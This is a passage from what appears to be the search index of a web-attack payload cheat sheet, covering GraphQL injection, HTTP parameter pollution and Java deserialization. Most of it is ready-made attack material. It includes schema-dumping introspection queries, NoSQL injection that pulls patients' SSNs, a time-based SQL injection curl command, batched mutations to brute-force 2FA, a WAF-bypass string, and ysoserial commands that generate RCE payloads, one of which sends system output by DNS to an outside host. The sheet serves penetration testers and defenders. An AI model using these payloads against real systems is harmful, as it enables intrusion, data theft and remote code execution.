+++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}} URL decoded query to dump the database schema. fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } } query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } Single line query to dump the database schema without fragments. __schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}} List path $ git clone https://gitlab.com/dee-see/graphql-path-enum $ graphql-path-enum -i ./test_data/h1_introspection.json -t Skill Found 27 ways to reach the \"Skill\" node from the \"Query\" node: - Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (checklist_check_response) -> ChecklistCheckResponse (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (checklist_checks) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (clusters) -> Cluster (weaknesses) -> Weakness (critical_reports) -> TeamMemberGroupConnection (edges) -> TeamMemberGroupEdge (node) -> TeamMemberGroup (team_members) -> TeamMember (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (embedded_submission_form) -> EmbeddedSubmissionForm (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (external_program) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (external_programs) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (job_listing) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (job_listings) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (me) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (pentest) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (pentests) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (query) -> Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (query) -> Query (skills) -> Skill Extract data example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}} Extract data using edges/nodes { \"query\": \"query { teams{ total_count,edges{ node{ id,_id,about,handle,state } } } }\" } Extract data using projections :warning: Don\u2019t forget to escape the \" inside the options . {doctors(options: \"{\\\"patients.ssn\\\" :1}\"){firstName lastName id patients{ssn}}} Enumerate the types' definition Enumerate the definition of interesting types using the following GraphQL query, replacing \"User\" with the chosen type {__type (name: \"User\") {name fields{name type{name kind ofType{name kind}}}}} Use mutations Mutations work like function, you can use them to interact with the GraphQL. # mutation{signIn(login:\"Admin\", password:\"secretp@ssw0rd\"){token}} # mutation{addUser(id:\"1\", name:\"Dan Abramov\", email:\"dan@dan.com\") {id name email}} NOSQL injection Use $regex , $ne from inside a search parameter. { doctors( options: \"{\\\"limit\\\": 1, \\\"patients.ssn\\\" :1}\", search: \"{ \\\"patients.ssn\\\": { \\\"$regex\\\": \\\".*\\\"}, \\\"lastName\\\":\\\"Admin\\\" }\") { firstName lastName id patients{ssn} } } SQL injection Send a single quote ' inside a graphql parameter to trigger the SQL injection { bacon(id: \"1'\") { id, type, price } } Simple SQL injection inside a graphql field. curl -X POST http://localhost:8080/graphql\\?embedded_submission_form_uuid\\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\\(30\\)%3B--%27 GraphQL Batching Attacks Common scenario: * Password Brute-force Amplification Scenario * 2FA bypassing mutation finishChannelVerificationMutation( $input FinishChannelVerificationInput!, $input2 FinishChannelVerificationInput!, $input3 FinishChannelVerificationInput!, ){ first: finishChannelVerificationMutation(input: $input){ channel{ id option{ ... onChannelSmsOptions{ number } } status notificationSubscription(last: 1000){ etc... } } } second: finishChannelVerificationMutation(input: $input2){...} third: finishChannelVerificationMutation(input: $input3){...} } References Introduction to GraphQL GraphQL Introspection API Hacking GraphQL - @ghostlulz - jun 8, 2019 GraphQL abuse: Bypass account level permissions through parameter smuggling - March 14, 2018 - @Detectify Discovering GraphQL endpoints and SQLi vulnerabilities - Sep 23, 2018 - Mat\u00edas Choren Securing Your GraphQL API from Malicious Queries - Feb 21, 2018 - Max Stoiber GraphQL NoSQL Injection Through JSON Types - June 12, 2017 - Pete Corey SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter - Nov 6th 2018 - @jobert Looting GraphQL Endpoints for Fun and Profit - @theRaz0r How to set up a GraphQL Server using Node.js, Express & MongoDB - 5 NOVEMBER 2018 - Leonardo Maldonado GraphQL cheatsheet - DEVHINTS.IO HIP19 Writeup - Meet Your Doctor 1,2,3 - June 22, 2019 - Swissky Introspection query leaks sensitive graphql system information - @Zuriel Graphql Bug to Steal Anyone\u2019s Address - Sept 1, 2019 - Pratik Yadav GraphQL Batching Attack - RENATAWALLARM - DECEMBER 13, 2019","title":"GraphQL injection"},{"location":"GraphQL%20Injection/#graphql-injection","text":"GraphQL is a query language for APIs and a runtime for fulfilling those queries with existing data. A GraphQL service is created by defining types and fields on those types, then providing functions for each field on each type","title":"GraphQL injection"},{"location":"GraphQL%20Injection/#summary","text":"GraphQL injection Summary Tools Exploit Identify an injection point Enumerate Database Schema via Introspection List path Extract data Extract data using edges/nodes Extract data using projections Enumerate the types' definition Use mutations NOSQL injection SQL injection GraphQL Batching Attacks References","title":"Summary"},{"location":"GraphQL%20Injection/#tools","text":"GraphQLmap - Scripting engine to interact with a graphql endpoint for pentesting purposes GraphQL-voyager - Represent any GraphQL API as an interactive graph GraphQL Security Toolkit - GraphQL Security Research Material Graphql-path-enum - Lists the different ways of reaching a given type in a GraphQL schema GraphQL IDE - An extensive IDE for exploring GraphQL API's ClairvoyanceX - Obtain GraphQL API schema despite disabled introspection InQL - A Burp Extension for GraphQL Security Testing Insomnia - Cross-platform HTTP and GraphQL Client AutoGraphql + introspection","title":"Tools"},{"location":"GraphQL%20Injection/#exploit","text":"","title":"Exploit"},{"location":"GraphQL%20Injection/#identify-an-injection-point","text":"Most of the time the graphql is located on the /graphql or /graphiql endpoint. example.com/graphql?query={__schema{types{name}}} example.com/graphiql?query={__schema{types{name}}} Check if errors are visible. ?query={__schema} ?query={} ?query={thisdefinitelydoesnotexist}","title":"Identify an injection point"},{"location":"GraphQL%20Injection/#enumerate-database-schema-via-introspection","text":"URL encoded query to dump the database schema. fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}} URL decoded query to dump the database schema. fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } } query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } Single line query to dump the database schema without fragments. __schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}","title":"Enumerate Database Schema via Introspection"},{"location":"GraphQL%20Injection/#list-path","text":"$ git clone https://gitlab.com/dee-see/graphql-path-enum $ graphql-path-enum -i ./test_data/h1_introspection.json -t Skill Found 27 ways to reach the \"Skill\" node from the \"Query\" node: - Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (checklist_check_response) -> ChecklistCheckResponse (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (checklist_checks) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (clusters) -> Cluster (weaknesses) -> Weakness (critical_reports) -> TeamMemberGroupConnection (edges) -> TeamMemberGroupEdge (node) -> TeamMemberGroup (team_members) -> TeamMember (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (embedded_submission_form) -> EmbeddedSubmissionForm (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (external_program) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (external_programs) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (job_listing) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (job_listings) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (me) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (pentest) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (pentests) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (query) -> Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill - Query (query) -> Query (skills) -> Skill","title":"List path"},{"location":"GraphQL%20Injection/#extract-data","text":"example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}","title":"Extract data"},{"location":"GraphQL%20Injection/#extract-data-using-edgesnodes","text":"{ \"query\": \"query { teams{ total_count,edges{ node{ id,_id,about,handle,state } } } }\" }","title":"Extract data using edges/nodes"},{"location":"GraphQL%20Injection/#extract-data-using-projections","text":":warning: Don\u2019t forget to escape the \" inside the options . {doctors(options: \"{\\\"patients.ssn\\\" :1}\"){firstName lastName id patients{ssn}}}","title":"Extract data using projections"},{"location":"GraphQL%20Injection/#enumerate-the-types-definition","text":"Enumerate the definition of interesting types using the following GraphQL query, replacing \"User\" with the chosen type {__type (name: \"User\") {name fields{name type{name kind ofType{name kind}}}}}","title":"Enumerate the types' definition"},{"location":"GraphQL%20Injection/#use-mutations","text":"Mutations work like function, you can use them to interact with the GraphQL. # mutation{signIn(login:\"Admin\", password:\"secretp@ssw0rd\"){token}} # mutation{addUser(id:\"1\", name:\"Dan Abramov\", email:\"dan@dan.com\") {id name email}}","title":"Use mutations"},{"location":"GraphQL%20Injection/#nosql-injection","text":"Use $regex , $ne from inside a search parameter. { doctors( options: \"{\\\"limit\\\": 1, \\\"patients.ssn\\\" :1}\", search: \"{ \\\"patients.ssn\\\": { \\\"$regex\\\": \\\".*\\\"}, \\\"lastName\\\":\\\"Admin\\\" }\") { firstName lastName id patients{ssn} } }","title":"NOSQL injection"},{"location":"GraphQL%20Injection/#sql-injection","text":"Send a single quote ' inside a graphql parameter to trigger the SQL injection { bacon(id: \"1'\") { id, type, price } } Simple SQL injection inside a graphql field. curl -X POST http://localhost:8080/graphql\\?embedded_submission_form_uuid\\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\\(30\\)%3B--%27","title":"SQL injection"},{"location":"GraphQL%20Injection/#graphql-batching-attacks","text":"Common scenario: * Password Brute-force Amplification Scenario * 2FA bypassing mutation finishChannelVerificationMutation( $input FinishChannelVerificationInput!, $input2 FinishChannelVerificationInput!, $input3 FinishChannelVerificationInput!, ){ first: finishChannelVerificationMutation(input: $input){ channel{ id option{ ... onChannelSmsOptions{ number } } status notificationSubscription(last: 1000){ etc... } } } second: finishChannelVerificationMutation(input: $input2){...} third: finishChannelVerificationMutation(input: $input3){...} }","title":"GraphQL Batching Attacks"},{"location":"GraphQL%20Injection/#references","text":"Introduction to GraphQL GraphQL Introspection API Hacking GraphQL - @ghostlulz - jun 8, 2019 GraphQL abuse: Bypass account level permissions through parameter smuggling - March 14, 2018 - @Detectify Discovering GraphQL endpoints and SQLi vulnerabilities - Sep 23, 2018 - Mat\u00edas Choren Securing Your GraphQL API from Malicious Queries - Feb 21, 2018 - Max Stoiber GraphQL NoSQL Injection Through JSON Types - June 12, 2017 - Pete Corey SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter - Nov 6th 2018 - @jobert Looting GraphQL Endpoints for Fun and Profit - @theRaz0r How to set up a GraphQL Server using Node.js, Express & MongoDB - 5 NOVEMBER 2018 - Leonardo Maldonado GraphQL cheatsheet - DEVHINTS.IO HIP19 Writeup - Meet Your Doctor 1,2,3 - June 22, 2019 - Swissky Introspection query leaks sensitive graphql system information - @Zuriel Graphql Bug to Steal Anyone\u2019s Address - Sept 1, 2019 - Pratik Yadav GraphQL Batching Attack - RENATAWALLARM - DECEMBER 13, 2019","title":"References"},{"location":"HTTP%20Parameter%20Pollution/","text":"HTTP Parameter Pollution Summary HTTP Parameter Pollution (HPP) is a Web attack evasion technique that allows an attacker to craft a HTTP request in order to manipulate web logics or retrieve hidden information. This evasion technique is based on splitting an attack vector between multiple instances of a parameter with the same name (?param1=value&param1=value). As there is no formal way of parsing HTTP parameters, individual web technologies have their own unique way of parsing and reading URL parameters with the same name. Some taking the first occurrence, some taking the last occurrence, and some reading it as an array. This behavior is abused by the attacker in order to bypass pattern-based security mechanisms. Tools No tools needed. Maybe Burp or OWASP ZAP. How to test HPP allows an attacker to bypass pattern based/black list proxies or Web Application Firewall detection mechanisms. This can be done with or without the knowledge of the web technology behind the proxy, and can be achieved through simple trial and error. Example scenario. WAF - Reads first param Origin Service - Reads second param. In this scenario, developer trusted WAF and did not implement sanity checks. Attacker -- http://example.com?search=Beth&search=' OR 1=1;## --> WAF (reads first 'search' param, looks innocent. passes on) --> Origin Service (reads second 'search' param, injection happens if no checks are done here.) Table of reference for which technology reads which parameter When ?par1=a&par1=b | Technology | Parsing Result |outcome (par1=)| | ------------------ |--------------- |:-------------:| | ASP.NET/IIS |All occurrences |a,b | | ASP/IIS |All occurrences |a,b | | PHP/Apache |Last occurrence |b | | PHP/Zues |Last occurrence |b | | JSP,Servlet/Tomcat |First occurrence |a | | Perl CGI/Apache |First occurrence |a | | Python Flask |First occurrence |a | | Python Django |Last occurrence |b | | Nodejs |All occurrences |a,b | | Golang net/http - r.URL.Query().Get(\"param\") |First occurrence |a | | Golang net/http - r.URL.Query()[\"param\"] |All occurrences |a,b | | IBM Lotus Domino |First occurrence |a | | IBM HTTP Server |First occurrence |a | | Perl CGI/Apache |First occurrence |a | | mod_wsgi (Python)/Apache |First occurrence |a | | Python/Zope |All occurrences in array |['a','b'] | References HTTP Parameter Pollution - Imperva HTTP Parameter Pollution in 11 minutes | Web Hacking - PwnFunction How to Detect HTTP Parameter Pollution Attacks - Acunetix","title":"HTTP Parameter Pollution"},{"location":"HTTP%20Parameter%20Pollution/#http-parameter-pollution","text":"","title":"HTTP Parameter Pollution"},{"location":"HTTP%20Parameter%20Pollution/#summary","text":"HTTP Parameter Pollution (HPP) is a Web attack evasion technique that allows an attacker to craft a HTTP request in order to manipulate web logics or retrieve hidden information. This evasion technique is based on splitting an attack vector between multiple instances of a parameter with the same name (?param1=value&param1=value). As there is no formal way of parsing HTTP parameters, individual web technologies have their own unique way of parsing and reading URL parameters with the same name. Some taking the first occurrence, some taking the last occurrence, and some reading it as an array. This behavior is abused by the attacker in order to bypass pattern-based security mechanisms.","title":"Summary"},{"location":"HTTP%20Parameter%20Pollution/#tools","text":"No tools needed. Maybe Burp or OWASP ZAP.","title":"Tools"},{"location":"HTTP%20Parameter%20Pollution/#how-to-test","text":"HPP allows an attacker to bypass pattern based/black list proxies or Web Application Firewall detection mechanisms. This can be done with or without the knowledge of the web technology behind the proxy, and can be achieved through simple trial and error. Example scenario. WAF - Reads first param Origin Service - Reads second param. In this scenario, developer trusted WAF and did not implement sanity checks. Attacker -- http://example.com?search=Beth&search=' OR 1=1;## --> WAF (reads first 'search' param, looks innocent. passes on) --> Origin Service (reads second 'search' param, injection happens if no checks are done here.)","title":"How to test"},{"location":"HTTP%20Parameter%20Pollution/#table-of-reference-for-which-technology-reads-which-parameter","text":"When ?par1=a&par1=b | Technology | Parsing Result |outcome (par1=)| | ------------------ |--------------- |:-------------:| | ASP.NET/IIS |All occurrences |a,b | | ASP/IIS |All occurrences |a,b | | PHP/Apache |Last occurrence |b | | PHP/Zues |Last occurrence |b | | JSP,Servlet/Tomcat |First occurrence |a | | Perl CGI/Apache |First occurrence |a | | Python Flask |First occurrence |a | | Python Django |Last occurrence |b | | Nodejs |All occurrences |a,b | | Golang net/http - r.URL.Query().Get(\"param\") |First occurrence |a | | Golang net/http - r.URL.Query()[\"param\"] |All occurrences |a,b | | IBM Lotus Domino |First occurrence |a | | IBM HTTP Server |First occurrence |a | | Perl CGI/Apache |First occurrence |a | | mod_wsgi (Python)/Apache |First occurrence |a | | Python/Zope |All occurrences in array |['a','b'] |","title":"Table of reference for which technology reads which parameter"},{"location":"HTTP%20Parameter%20Pollution/#references","text":"HTTP Parameter Pollution - Imperva HTTP Parameter Pollution in 11 minutes | Web Hacking - PwnFunction How to Detect HTTP Parameter Pollution Attacks - Acunetix","title":"References"},{"location":"Insecure%20Deserialization/","text":"Insecure Deserialization Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications. Deserialization is the reverse of that process -- taking data structured from some format, and rebuilding it into an object - OWASP Check the following sub-sections, located in other files : Java deserialization : ysoserial, ... PHP (Object injection) : phpggc, ... Ruby : universal rce gadget, ... Python : pickle, ... References Github - ysoserial Github - ysoserial.net Java-Deserialization-Cheat-Sheet - GrrrDog Understanding & practicing java deserialization exploits How i found a 1500$ worth Deserialization vulnerability - @D0rkerDevil Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - 14 Aug 2017, Peter St\u00f6ckli PHP Object Injection - OWASP PHP Object Injection - Thin Ba Shane PHP unserialize PHP Generic Gadget - ambionics security RUBY 2.X UNIVERSAL RCE DESERIALIZATION GADGET CHAIN - elttam, Luke Jahnke Java Deserialization in manager.paypal.com by Michael Stepankin Instagram's Million Dollar Bug by Wesley Wineberg Ruby Cookie Deserialization RCE on facebooksearch.algolia.com by Michiel Prins (michiel) Java deserialization by meals Diving into unserialize() - Sep 19- Vickie Li .NET Gadgets by Alvaro Mu\u00f1oz (@pwntester) & OleksandrMirosh ExploitDB Introduction","title":"Insecure Deserialization"},{"location":"Insecure%20Deserialization/#insecure-deserialization","text":"Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications. Deserialization is the reverse of that process -- taking data structured from some format, and rebuilding it into an object - OWASP Check the following sub-sections, located in other files : Java deserialization : ysoserial, ... PHP (Object injection) : phpggc, ... Ruby : universal rce gadget, ... Python : pickle, ...","title":"Insecure Deserialization"},{"location":"Insecure%20Deserialization/#references","text":"Github - ysoserial Github - ysoserial.net Java-Deserialization-Cheat-Sheet - GrrrDog Understanding & practicing java deserialization exploits How i found a 1500$ worth Deserialization vulnerability - @D0rkerDevil Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - 14 Aug 2017, Peter St\u00f6ckli PHP Object Injection - OWASP PHP Object Injection - Thin Ba Shane PHP unserialize PHP Generic Gadget - ambionics security RUBY 2.X UNIVERSAL RCE DESERIALIZATION GADGET CHAIN - elttam, Luke Jahnke Java Deserialization in manager.paypal.com by Michael Stepankin Instagram's Million Dollar Bug by Wesley Wineberg Ruby Cookie Deserialization RCE on facebooksearch.algolia.com by Michiel Prins (michiel) Java deserialization by meals Diving into unserialize() - Sep 19- Vickie Li .NET Gadgets by Alvaro Mu\u00f1oz (@pwntester) & OleksandrMirosh ExploitDB Introduction","title":"References"},{"location":"Insecure%20Deserialization/Java/","text":"Java Deserialization Detection \"AC ED 00 05\" in Hex \"rO0\" in Base64 Content-type = \"application/x-java-serialized-object\" \"H4sIAAAAAAAAAJ\" in gzip(base64) Exploit ysoserial : A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin java -jar ysoserial-master-v0.0.4-g35bce8f-67.jar Groovy1 'ping 127.0.0.1' > payload.bin java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64 payload author dependencies impact (if not RCE) BeanShell1 @pwntester, @cschneider4711 bsh:2.0b5 C3P0 @mbechler c3p0:0.9.5.2, mchange-commons-java:0.2.11 Clojure @JackOfMostTrades clojure:1.8.0 CommonsBeanutils1 @frohoff commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2 CommonsCollections1 @frohoff commons-collections:3.1 CommonsCollections2 @frohoff commons-collections4:4.0 CommonsCollections3 @frohoff commons-collections:3.1 CommonsCollections4 @frohoff commons-collections4:4.0 CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1 CommonsCollections6 @matthias_kaiser commons-collections:3.1 FileUpload1 @mbechler commons-fileupload:1.3.1, commons-io:2.4 file uploading Groovy1 @frohoff groovy:2.3.9 Hibernate1 @mbechler Hibernate2 @mbechler JBossInterceptors1 @matthias_kaiser javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 JRMPClient @mbechler JRMPListener @mbechler JSON1 @mbechler json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1 JavassistWeld1 @matthias_kaiser javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 Jdk7u21 @frohoff Jython1 @pwntester, @cschneider4711 jython-standalone:2.5.2 MozillaRhino1 @matthias_kaiser js:1.7R2 Myfaces1 @mbechler Myfaces2 @mbechler ROME @mbechler rome:1.0 Spring1 @frohoff spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE Spring2 @mbechler spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2 URLDNS @gebl jre only vuln detect Wicket1 @jacob-baines wicket-util:6.23.0, slf4j-api:1.6.4 Burp extensions using ysoserial JavaSerialKiller Java Deserialization Scanner Burp-ysoserial SuperSerial SuperSerial-Active Other tools JRE8u20_RCE_Gadget JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool ysoserial-modified gadgetprobe marshalsec - Turning your data into code execution java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]] where -a - generates/tests all payloads for that marshaller -t - runs in test mode, unmarshalling the generated payloads after generating them. -v - verbose mode, e.g. also shows the generated payload in test mode. gadget_type - Identifier of a specific gadget, if left out will display the available ones for that specific marshaller. arguments - Gadget specific arguments Payload generators for the following marshallers are included: Marshaller Gadget Impact BlazeDSAMF(0|3|X) JDK only escalation to Java serialization various third party libraries RCEs Hessian|Burlap various third party RCEs Castor dependency library RCE Jackson possible JDK only RCE , various third party RCEs Java yet another third party RCE JsonIO JDK only RCE JYAML JDK only RCE Kryo third party RCEs KryoAltStrategy JDK only RCE Red5AMF(0|3) JDK only RCE SnakeYAML JDK only RCEs XStream JDK only RCEs YAMLBeans third party RCE References Github - ysoserial Java-Deserialization-Cheat-Sheet - GrrrDog Understanding & practicing java deserialization exploits How i found a 1500$ worth Deserialization vulnerability - @D0rkerDevil Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - 14 Aug 2017, Peter St\u00f6ckli Jackson CVE-2019-12384: anatomy of a vulnerability class On Jackson CVEs: Don\u2019t Panic \u2014 Here is what you need to know Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464) - Michael Stepankin / @artsploit - 29 June 2021","title":"Java Deserialization"},{"location":"Insecure%20Deserialization/Java/#java-deserialization","text":"","title":"Java Deserialization"},{"location":"Insecure%20Deserialization/Java/#detection","text":"\"AC ED 00 05\" in Hex \"rO0\" in Base64 Content-type = \"application/x-java-serialized-object\" \"H4sIAAAAAAAAAJ\" in gzip(base64)","title":"Detection"},{"location":"Insecure%20Deserialization/Java/#exploit","text":"ysoserial : A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin java -jar ysoserial-master-v0.0.4-g35bce8f-67.jar Groovy1 'ping 127.0.0.1' > payload.bin java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64 payload author dependencies impact (if not RCE) BeanShell1 @pwntester, @cschneider4711 bsh:2.0b5 C3P0 @mbechler c3p0:0.9.5.2, mchange-commons-java:0.2.11 Clojure @JackOfMostTrades 